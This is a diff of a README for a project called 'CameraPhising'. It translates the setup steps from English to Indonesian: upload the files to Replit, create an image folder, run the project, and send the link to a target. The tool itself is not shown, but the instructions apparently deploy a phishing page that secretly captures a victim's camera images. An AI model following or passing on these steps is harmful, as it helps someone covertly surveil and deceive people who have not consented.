@@ -1,11 +1,11 @@
 # CameraPhising
 
- How to install
+ Cara install
 
- > 1.Upload all file to repilt
+ > 1. Buka dan import semua file ini ke replit
  
- > 2.Create folder name "uploads"
+ > 2. Buat folder dengan nama "image"
  
- > 3.run the project
+ > 3. Jalankan project
 
- > 4.send link to target
+ > 4. Kirim link ke target
